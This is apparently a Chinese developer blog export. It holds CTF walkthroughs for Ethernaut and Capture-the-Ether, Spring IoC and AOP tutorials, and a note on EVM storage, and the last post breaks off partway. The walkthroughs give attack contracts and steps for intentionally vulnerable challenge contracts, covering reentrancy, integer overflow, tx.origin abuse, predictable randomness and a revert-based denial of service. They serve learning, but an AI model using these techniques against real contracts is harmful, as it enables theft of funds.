[{"title":"Ethernaut","url":"/2023/02/25/Ether/","content":"此文章会记录在Ethernaut上经历的题。\n\nHello Ethernaut在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！收获：  \n\n关键字的使用\n各种变量的存储位置\n\n\nFallback任务要求：获取合约的所有权；将余额减为零源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n解题点：\nreceive() external payable &#123;  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);  owner = msg.sender;&#125;\n\n\nreceive方法\n\n一个合约至多含有一个receive()函数,\n没有function关键字、没有参数，没有返回值\n可见性必须声明为external，必须含有payable关键字\n允许使用modifier修改器\n\n当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发，执行ether的传输（类似于基本的send(),transfer()函数）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常\n选自solidity官方文档v0.8.13\n\n参考：1）执行实例中的contribute方法，向合约发送最多0.001ether。2）向合约发送以太，触发receive方法。3）执行实例中的withdraw方法\n\nFallout任务要求：获取合约的所有权卖眼镜的做的题源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123;    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  /* constructor */  function Fal1out() public payable &#123;    owner = msg.sender;    allocations[owner] = msg.value;  &#125;  modifier onlyOwner &#123;\t        require(\t            msg.sender == owner,\t            &quot;caller is not the owner&quot;\t        );\t        _;\t    &#125;  function allocate() public payable &#123;    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  &#125;  function sendAllocation(address payable allocator) public &#123;    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  &#125;  function collectAllocations() public onlyOwner &#123;    msg.sender.transfer(address(this).balance);  &#125;  function allocatorBalance(address allocator) public view returns (uint) &#123;    return allocations[allocator];  &#125;&#125;\n解题点：\ncontract Fallout is Ownable &#123;...function Fal1out() public payable &#123;...\n作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数\n\n在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。\n\n这是在使用编译器0.4.22之前的版本时所需注意的\n\n\n参考：直接调用函数Fal1out\n\nCoin Flip任务要求：连续猜对硬币的正反面十次。区区千分之一的运气我也不是没有源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n解题点：硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。\n参考：获取实例地址在remix上部署一份攻击合约（只需要在获取结果后调用实例）之后连续使用攻击合约的方法进行攻击10次就行\n\n知识点SafeMath库：防溢出的增强型运算方法block.num：当前区块数（记得添加一个与web3的链接block.blockhash：区块哈希值\n\n\nTelephone任务要求：获取合约的所有权源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n解题点：\nfunction changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;&#125;\n本题涉及到tx.origin与msg.sender的区别：前者表示交易的发送者，后者则表示消息的发送者。\n如果情景是在一个合约下的调用，那么这两者是木有区别的；但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户。\n参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner\n\nToken任务要求：获取更多的Token源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public &#123;    balances[msg.sender] = totalSupply = _initialSupply;  &#125;  function transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;  function balanceOf(address _owner) public view returns (uint balance) &#123;    return balances[_owner];  &#125;&#125;\n解题点：\nfunction transfer(address _to, uint _value) public returns (bool) &#123;    require(balances[msg.sender] - _value &gt;= 0);    balances[msg.sender] -= _value;    balances[_to] += _value;    return true;  &#125;\n这里可以通过下溢 绕过require检测，因为_value和balance[]都为无符号整数，所以结果会变为2^256-1\n参考：略\n\nDelegation任务要求：获取合约的所有权源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;  address public owner;  constructor(address _owner) &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n分析：这题包含了两个合约Delegation和Delegate，Delegation合约实例化了Delegate合约，又在其Fallback函数中使用了delegatecall来调用了delegate合约。\n\ncall函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool） 和返回的数据（ bytes memory）。而delegatecall又与call有所不同；通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。这个函数主要是方便我们使用存在其他地方的函数（用户必须确保两个合约中的存储结构都适合使用delegatecall。）\n\n解题点：使用delegatecall调用delegate合约的pwn函数。\n\nForce任务要求：让合约的balance大于0\n解题点：MEOW~（不是）\n在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。\n\n这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。\n\n因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。\n\nVault任务要求：将合约中的bool值改变\n解题点：输入密码废话\n任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值\n\nweb3.eth.getStorageAt(address, position [, defaultBlock] [, callback])参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数Returns ：返回给定位置的值\n选自web3.eth官方文档\n\n\nKing任务要求：确保王位\n解题点：payable(king).transfer(msg.value);\n当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king\n参考：\npragma ...contract attack&#123;  constructor (address _addr) public payable&#123;    _addr.call&#123;gas:100000000,value:msg.value&#125;;  &#125;  receive() external payable &#123;    revert();  &#125;&#125;\n\nRe-entrancy任务要求：盗取合约中的所有代币\n解题点：\nfunction withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;\n\n重入的关键：发送完成后才进行了sender的balances更新，所以只需要使其不断进行call.value发送eth，同样使用Fallback函数来实现\nElevator这个电梯不让你到达顶楼，想办法到达顶楼\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;\n该题提供了一个接口，在合约中我们看到接口的isLastFloor函数是用来衡量当前楼层是否是顶楼。所以题解在于如何实现isLastFloor函数。方法中执行了两次isLastFloor函数，在通过条件语句时是取反判定，因此我们可以让函数内部进行取反操作这样就可以在执行两次后得到true值。\ncontract attack &#123;    Elevator ele;    bool b = true;    function isLastFloor(uint) view public retuens(bool) &#123;        t = !t;        return t;    &#125;    function hk(address _addr) public &#123;        ele = Elevator(_addr);        ele.goTo(1);    &#125;&#125;\n\nNaughtCoin通过转移走合约中的所有余额来完成此关。\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;; contract NaughtCoin is ERC20 &#123;  // string public constant name = &#x27;NaughtCoin&#x27;;  // string public constant symbol = &#x27;0x0&#x27;;  // uint public constant decimals = 18;  uint public timeLock = block.timestamp + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;    player = _player;    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  &#125;    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;    super.transfer(_to, _value);  &#125;  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() &#123;    if (msg.sender == player) &#123;      require(block.timestamp &gt; timeLock);      _;    &#125; else &#123;     _;    &#125;  &#125; &#125; \n合约导入了ERC20，所以对于代币的转移除了重写的transfer还有transfrom方法，只需要注意transfrom函数还需要额外的操作：approve\n","categories":["靶场"],"tags":["题解","Ethernaut","Ethereum","Remix"]},{"title":"SpringIoC","url":"/2022/12/01/SpringIoC/","content":"简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？\n\n基本概念下面从一个生活实例对控制反转进行解释（也称依赖注入(Dependency Injection,DI)，只是执行角度不同，是同一个概念）\n\n如果我们要吃饭，就可以有两种选择：一是自己做；另一种是下馆子。当我们要自己做时，就需要自己准备食材、进行烹饪。而下馆子只需要根据自己的需要让店家提供。控制反转的思想便包含在了上述的例子中：将执行操作交给Spring容器。由容器控制对象的创建以及查找并注入依赖的资源，而资源则集中管理，实现资源的可配置和易管理，降低了使用资源双方的依赖程度，松耦合\n\n常用注解\n在Spring框架中，仅管使用XML配置文件可以很简单地装配Bean，但对于需要配置大量的Bean时，其XML文件会过于庞大，不方便维护。  \n\n因此推荐使用注解(annotation)的方式去装配Bean\n声明Bean的注解\n@Component\n\n\n表示一个组件对象(Bean)\n作用于任何层次上\n无明确角色\n一个泛化的概念\n\n\n@Repository\n\n\n将数据访问层(Dao)的类标识为Bean\n功能与@Component相同\n\n\n@Service\n\n\n标注一个业务逻辑组件类（Service）\n功能与@Component相同\n\n\n@Controller\n\n\n用于标注一个控制器组件类（Spring MVC 的Controller）\n功能与@Component相同\n\n注入Bean的注解\n@Autowired\n\n\n可以对类成员变量、方法及构造方法进行标注，完成自动装配的工作\n消除setter getter方法\n\n\n@Resource\n\n\n与@Autowired功能一样\n区别：默认是按照名称来装配注入的，只有当找不到与名称匹配的Bean时才会按照类型来装配注入；\n@Recourse的两个属性：\nname：指定Bean实例名称\ntype：指定Bean类型\n\n\n\n\n@Qualifier\n\n\n与@Autowired注解配合使用。当@Autowired需要按照名称来装配注入时，则使用@Qualifier\n\nSpring IoC容器（ApplicationContext）负责创建和注入Bean。Spring提供使用XML配置、注解、Java配置以及groovy配置实现Bean的创建和注入。\n实例一 （基于注解的依赖注入）\n步骤：创建Web应用，导入jar包（Spring4件套、第三方依赖包和spring-aop（用于扫描注解））创建Annotation包在该包下创建DAO层在该包下创建Service层在该包下创建Controller层创建配置类创建测试类\n\nDao层代码import ;@Repository//等价于@Repository(name = &quot;theDao&quot;)public class theDao &#123;    public void save() &#123;        System.out.println(&quot;testDao save&quot;);    &#125;&#125;\nService层代码import ;@Service//相当于@Service(&quot;theService&quot;)public class theService &#123;    @Resource(name = &quot;theDao&quot;)    //相当于@Autowired，    private theDao testDao;    public void save() &#123;        System.out.println(&quot;testService save&quot;);        testDao.save();    &#125;&#125;\nController层代码import ;@Controllerpublic class theController &#123;    @Autowired    private theService testService;    public void save() &#123;        testService.save();        System.out.println(&quot;testController save&quot;);    &#125;&#125;\n配置类import ;@Configuration  //声明当前类是配置类，相当于一个XML文件@ComponentScan(&quot;annotation&quot;)    //自动扫描当前包下使用的注解，并注册为Beanpublic class Configannotation &#123;    ...&#125;\n测试类import ;public class TestAnnotation &#123;    public static void main(String[] args) &#123;        AnnotationConfigApplicationContext appCon =             new AnnotationConfigApplicationContext(Configannotation.class);        theController tc =appCon.getBean(theController.class);        tc.save();        appCon.close();    &#125;&#125;\n实例二 （Java配置）Java配置是通过@Configuration和@Bean来实现的  \n\n@Configuration声明当前类作为一个配置类@Bean注解在方法上，声明当前方法的返回值为一个Bean\n\nDao层代码import ;public class theDao &#123;    public void save() &#123;        System.out.println(&quot;testDao save&quot;);    &#125;&#125;\nService层代码import ;public class theService &#123;    theDao testDao;    public void setTestDao(theDao testDao)&#123;        this.testDao = testDao;    &#125;    public void save() &#123;        testDao.save();    &#125;&#125;\nController层代码import ;public class theController &#123;    @Autowired    theService testService;    public void setTestService(theService testService) &#123;        this.testService = testService;    &#125;    public void save() &#123;        testService.save();    &#125;&#125;\n配置类import ;@Configuration  //声明当前类是配置类，相当于一个XML文件public class Configannotation &#123;    @Bean    public theDao getTestDao() &#123;        return new theDao();    &#125;    @Bean    public theService getTestService() &#123;        theService ts = new theService();        ts.setTestDao(getTestDao());        return ts;    &#125;    @Bean    public theController getTestController() &#123;        theController ts = new theController();        ts.setTestService(getTestService());        return ts;    &#125;&#125;\n测试类import ;public class TestConfig &#123;    public static void main(String[] args) &#123;        //初始化Spring容器ApplicationContext        AnnotationConfigApplicationContext appCon =         new AnnotationConfigApplicationContext(Configannotation.class);        theController tc =appCon.getBean(theController.class);        tc.save();        appCon.close();    &#125;&#125;\n总结\n控制反转是一种通过描述（可以是xml或注解）并通过第三方产生或获取特定对象的方式。\n在Spring中实现控制反转的是IoC容器\n实现方法是依赖注入\n\n\n常用注解\n两种Bean的创建和注入：通过对比可以看出，有时候使用Java配置反而更加繁琐。\n全局配置尽量使用Java配置\n业务Bean的配置尽量使用注解配置\n\n\n\n","categories":["Spring Boot"],"tags":["教程"]},{"title":"Hello World","url":"/2022/12/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"SpringAOP","url":"/2022/12/26/SpringAOP/","content":"Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。\n\nSpring AOP的基本概念AOP的概念AOP（Aspect-Oriented Programming）即面向切面编程，相应的就是OOP，面向对象编程。在OOP中，以类作为程序的基本单位，而在AOP中则是以切面作为基本单位。  \n\n在业务处理功能中，通常都有日志记录、事务处理、异常处理等操作，如果是使用OOP可以通过封装或继承的方法实现代码重写来应用到多个业务中，但仍存在同样的代码分散到各个方法中。因此，AOP采取横向抽取机制，将分散在各个方法中的重复代码提取出来，然后在程序编译或运行阶段，再将抽取出来的代码应用到需要执行的地方。  \n\n传统的OOP是无法实现这样的横向抽取机制，因为OOP实现的是父子的纵向重用。但AOP并不是OOP的替代品，而是对OOP的一种补充，进而相辅相成。\nAOP的基本术语\n切面（Aspect）指封装横切到系统功能的类  \n连接点（Joinpoint）指程序运行中的一些时间点（如方法的调用或异常的抛出）  \n切入点（Pointcut）指那些需要处理的连接点，在Spring AOP中，所有的方法执行都是连接点，而切入点是一个描述信息，用来修饰连接点，确定哪些连接点需要被处理。  \n通知（增强处理）由切面添加到特点的连接点（满足切入点规则）的一段代码，\n引入（Introduction）允许在现有的实现类中添加自定义的方法和属性  \n目标对象（Target Object）指所有被通知的对象。\n代理（Proxy）是通知应用到目标对象后，被动态创建的对象\n织入（Weaving）\n\n","categories":["Spring Boot"],"tags":["教程"]},{"title":"temp","url":"/2023/04/08/temp/","content":"以太坊的数据存储对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节（256bit），是一种键值对的形式。\npragma solidity^0.8.10;contract test&#123;    uint256 public a=9;    uint256[2] public b;    address c;    function t() public &#123;        b[0] = 63;        b[1] =96;        c = msg.sender;    &#125;&#125;\n这里就可以看到对于32字节固定长度的数据每个都占据一个key，key&#x3D;1对应变量a的存储位。key&#x3D;1，2对应变量b的两个存储位。相应的value便是变量的值。因为在EVM中存储数据是需要消耗gas的，不论是永久的storage还是内存的memory只是消耗的gas量不同（storage比memory更昂贵），所以solidity里进行了一定的存储优化，简单来讲，即定义的这个变量所占的空间小于32个字节时，它所占据的这个存储位的空间可以与它后面的变量共享（当然前提是这个变量塞的下去）因为在EVM里将数据写入一个新位置和写入一个已经分配出来的位置所需的gas是不一样的。\nuint16 public d=12;  uint16 public g=8;  bytes16 public name=&quot;lex&quot;;可以看到上面三个变量占用了同一个存储位key&#x3D;0，但占 用着空间的不同位置。实现了存储的共享对于动态数据的存储，有着自己的计算规则：keccak256(bytes32(key)+bytes32(position))此处的key为映射的key，position则是定义变量的位置。根据此式我们可以算出变量存储位置\n"},{"title":"Capture-the-Ether","url":"/2023/04/01/Capture-the-Ether/","content":"由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助(TvT) (TvT) (TvT) (TvT) (TvT)\n\nLotteriesGuess Numberpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123;    uint8 answer = 42;    function GuessTheNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n题目直接给出了答案，直接填对于一个普通的数字，通过枚举它总是可以被猜中的，同时当有人知道了答案时，他就能直接获取奖励，很显然这对于其他不知道答案的人是极其不公平的；因此，我们对其进行处理改进：\nThe Secret Numberpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123;    ---不同点---    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    function GuessTheSecretNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (keccak256(n) == answerHash) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n由于结果是一个uint8的hash值所以我们只能够进行暴力枚举。\ncontract attack&#123;    function sol() public returns (uint8)&#123;        for(uint8 i=0;i&lt;255;i++)&#123;            if(keccak256(i)==            0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365)            &#123;retuen i;&#125;        &#125;    &#125;&#125;\n实现：这样的操作也只是避免了直接获取结果得出答案的情况——哈希算法是不可逆的加密算法，一定程度上提高了安全性，但仍然可以暴力枚举破解。\nThe Randon Numberpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123;    uint8 answer;    function GuessTheRandomNumberChallenge() public payable &#123;        require(msg.value == 1 ether);        ---不同点---        answer = uint8(keccak256(block.blockhash(block.number - 1), now));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n这次的结果是根据当前的区块数和时间来制定的，他是随机的，这样就大大的增强了安全强度，避免了反复使用一个结果。通过web3查询部署该合约时当前的区块高度和时间来得到answer，再进行输入即可。先获取合约所在块的高度或者区块哈希web3.eth.getTransaction(transactionHash).BlockNumber\\BlockHash再通过区块高度或区块哈希找当前区块的timestampweb3.eth.getBlock(BlockNumber).timestamp可以从返回值中看到\n\n另外，由于answer是存储在合约中的（storage）因此，只要我们理解了他是如何存储的我们也能够通过ethers.js中的getStorageAt方法来获取answer的值\n\nThe New Number在上一个的合约代码中我们可以看到answer是在合约部署时就已经赋值了，而这次我们将其放在方法中，只有在有用户使用这个方法时才对answer进行赋值操作。\npragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123;    function GuessTheNewNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n由于block.number状态变量允许获取当前块的高度。但是，在EVM中执行事务的那一刻，由于显而易见的原因，尚未知道正在创建的块的blockhash，所以我们无法通过web3进行查询，但是在我们调用这一合约时，是在同一个区块进行的，也就是说通过攻击合约进行模拟挑战中的所有操作然后调用guess方法，而不需要通过在链下进行计算再提交答案并保证交易在下一区块立即被挖矿的情形。\ncontract attack&#123;    GuessTheNewNumberChallenge gus;    function attack(address _add) public&#123;        gue = GuessTheNewNumberChallenge(_add);    &#125;    function att()public payable&#123;        uint8 val = uint8(keccak256(block.blockhash(block.number - 1), now));        gue.guess.value(1 ether)(val);    &#125;&#125;\nPredict the futurepragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123;    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(uint8 n) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n先下注，后开奖。由于不能预测未来区块的内容，所以对于answer我们无法准确掌握，但是这里的answer是一个0~9的数，因此我们可以设定一个值等待answer自己撞上来。\ncontract attack&#123;    PredictTheFutureChallenge pre;    uint8 public answer=2;          function attack(address _add)public&#123;        pre = PredictTheFutureChallenge(_add);    &#125;    function lock()public payable &#123;        pre.lockInGuess.value(1 ether)(answer);    &#125;    function sol() public &#123;        uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if(temp == answer)&#123;            pre.settle();        &#125;    &#125;&#125;\n\nPredict the block hashpragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123;    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(bytes32 hash) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n同样是预测未来区块的内容，显然这根本是不可能的。但是在EVM中block.blockhash保存的最大数目是最近的256个区块，也即是说当超出最新区块256个区块之后的block.blockhash将被置为0。因此我们同样只需要等。（10s一个块，256*10&#x2F;60 过个一小时吧（笑）\nMathToken sale要求：转走合约中的余额\npragma solidity ^0.4.21;contract TokenSaleChallenge &#123;    mapping(address =&gt; uint256) public balanceOf;    uint256 constant PRICE_PER_TOKEN = 1 ether;    function TokenSaleChallenge(address _player) public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance &lt; 1 ether;    &#125;    function buy(uint256 numTokens) public payable &#123;        require(msg.value == numTokens * PRICE_PER_TOKEN);        balanceOf[msg.sender] += numTokens;    &#125;    function sell(uint256 numTokens) public &#123;        require(balanceOf[msg.sender] &gt;= numTokens);        balanceOf[msg.sender] -= numTokens;        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);    &#125;&#125;\n分析：因为合约的货币只有两个方法sell()、buy()，所以我们只有卖出比我们所购买的更多的货币才能达成address(this).balance &lt; 1 ether的条件。在买入时有这么一个检查：require(msg.value == numToken * PRICE_PER_TOKEN)，因为PRICE_PER_TOKEN是一个不可修改的值，但可以通过与numToken的乘积进行溢出，从而绕过检查uint256的最大值为2^256-1：115792089237316195423570985008687907853269984665640564039457584007913129639935，所以该值除以10^18后添个一就是造成溢出的最小值：115792089237316195423570985008687907853269984665640564039457 + 1溢出的结果为415992086870360064所以我们只需要发送415992086870360064wei，提出115792089237316195423570985008687907853269984665640564039458的购买量就能够获得大量的货币。之后，我们卖出1 ether来完成挑战\nToken Whale要求：拥有1,000,000的余额\npragma solidity ^0.4.21;contract TokenWhaleChallenge &#123;    address player;    uint256 public totalSupply;    mapping(address =&gt; uint256) public balanceOf;    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    string public name = &quot;Simple ERC20 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    function TokenWhaleChallenge(address _player) public &#123;        player = _player;        totalSupply = 1000;        balanceOf[player] = 1000;    &#125;    function isComplete() public view returns (bool) &#123;        return balanceOf[player] &gt;= 1000000;    &#125;    event Transfer(address indexed from, address indexed to, uint256 value);    function _transfer(address to, uint256 value) internal &#123;        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);    &#125;    function transfer(address to, uint256 value) public &#123;        require(balanceOf[msg.sender] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        _transfer(to, value);    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    function approve(address spender, uint256 value) public &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);    &#125;    function transferFrom(address from, address to, uint256 value) public &#123;        require(balanceOf[from] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        require(allowance[from][msg.sender] &gt;= value);        allowance[from][msg.sender] -= value;        _transfer(to, value);    &#125;&#125;\n分析：合约是一个与ERC20标准类似的货币，没有使用SafeMath库进行检查，问题更大的是transferFrom()函数中调用_transfer()不是在from和to之间的交易而是msg.sender和to之间的交易，这就是漏洞的关键我们可以利用一份代理地址，玩家可以给代理地址分配任意的allowance，由代理地址向玩家和另一个地址进行transferFrom()，这样在执行_transfer()的过程中，代理地址的余额将会发生溢出，获得大量的货币，最后再将代理地址的余额用transfer()转移给玩家就可以通过挑战了大致流程player：addr1ToAccount：addr2ProxyAccount：addr3  \n\nplayer.approve(addr3,1000000)        &#x2F;&#x2F;满足后续allowance[player][ProxyAccount]的条件  \nProxyAccount.transferFrom(addr1,addr2,1)        &#x2F;&#x2F;ToAccount无关紧要，交易完成后balanceOf[addr3]将会获得很多\nProxyAccount.transfer(player,1000000)        &#x2F;&#x2F;将获得的余额转入玩家地址\n\nRetirement fund源代码：\npragma solidity ^0.4.21;contract RetirementFundChallenge &#123;    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function withdraw() public &#123;        require(msg.sender == owner);        if (now &lt; expiration) &#123;            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        &#125; else &#123;            msg.sender.transfer(address(this).balance);        &#125;    &#125;    function collectPenalty() public &#123;        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn 